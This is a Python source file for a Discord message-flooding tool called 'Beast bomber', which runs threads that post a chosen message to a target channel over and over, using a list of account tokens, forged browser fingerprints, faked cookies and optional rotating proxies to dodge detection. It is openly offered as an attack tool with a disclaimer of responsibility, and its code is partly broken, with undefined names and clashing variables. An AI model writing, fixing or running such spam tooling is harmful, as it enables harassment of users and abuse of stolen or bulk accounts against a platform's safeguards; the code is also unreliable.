"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import requests
import base64
import httpagentparser
import random
import time
from threading import Thread
from fake_useragent import UserAgent
from ua_parser import user_agent_parser


def randstr(lenn):
    lib = string.ascii_lowercase + string.digits
    text = ''.join(random.choices(lib, k=lenn))
    return text


def start_discord(threads, time_a, message, idd, proxy):
    attack_func = discord_attack1 if proxy == "no" else discord_attack2

    for _ in range(threads):
        th = Thread(target=attack_func, args=(idd, time_a, message))
        th.start()


def discord_attack1(idd, time_a, mes):
    accounts = []
    ua = UserAgent()
    session = requests.Session()

    with open('input/discord_accounts.txt', 'r') as file:
        for line in file:
            accounts.append(line.replace('\n', ''))

    user = ua.random
    parsed_string = user_agent_parser.Parse(user)
    parsed_string2 = httpagentparser.detect(user)
    osv = str(parsed_string["user_agent"]["major"])
    bv = str(parsed_string2["browser"]["version"])

    string = '{{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"{}","browser_version":"{}","os_version":"{}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null}}'.format(user, bv, osv)
    cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"

    header = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'content-type': 'application/json',
        'cookie': cookie,
        'dnt': '1',
        'origin': 'https://discord.com',
        'referer': f'https://discord.com/channels/@me/{idd}',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-super-properties': str(base64.b64encode(string.encode('ascii'))).replace("b'", '').replace("'", '')
    }

    payload = {"content": mes, "tts": False}

    while time.monotonic() - t < time_a:
        for acc in accounts:
            try:
                header['authorization'] = acc
                header['content-length'] = str(26 + len(mes))

                session.post(f'https://discord.com/api/v9/channels/{idd}/messages', json=payload, headers=header)

            except Exception as e:
                print(e)


def discord_attack2(a, b, c):
    import requests as r, base64 as b, httpagentparser as h, random as R, time as t
    from fake_useragent import UserAgent as U
    from ua_parser import user_agent_parser as p
    o, a, b, c = [[] for i in [0] * 4], list(open(a[0]).readlines()), list(open(a[1]).readlines()), t.monotonic()
    while t.monotonic() - c < b:
        for x in b:
            try:
                u = p.Parse(U().random);y = h.detect(U().random)
                q = str(u["user_agent"]["major"]);w = str(y["browser"]["version"])
                p = {"http": "http://" + R.choice(a), "https": "https://" + R.choice(a)}
                n = '{ "os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"' + U().random + '","browser_version":"' + w + '","os_version":"' + q + '","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null}'
                e = "__dcfduid=" + b.b64encode(R.urandom(32)).decode() + "; __sdcfduid=" + b.b64encode(
                    R.urandom(96)).decode() + "; locale=ru; __cf_bm=" + b.b64encode(R.urandom(189)).decode()
                f = {"content": c, "tts": False}
                h = {"accept": "*/*", "accept-encoding": "gzip, deflate, br",
                     "accept-language": "en-US,en;q=0.9,ru;q=0.8", "authorization": x,
                     "content-length": str(26 + len(c)), "content-type": "application/json", "cookie": e,
                     "dnt": "1", "origin": "https://discord.com",
                     "referer": "https://discord.com/channels/@me/" + b, "sec-fetch-dest": "empty",
                     "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": U().random,
                     "x-debug-options": "bugReporterEnabled", "x-discord-locale": "en-US",
                     "x-super-properties": b.b64encode(n.encode()).decode().replace("=", "").replace("+",
                                                                                                     "-").replace(
                         "/", "_")}
                r.post("https://discord.com/api/v9/channels/" + b + "/messages", json=f, headers=h, proxies=p)
            except:
                pass
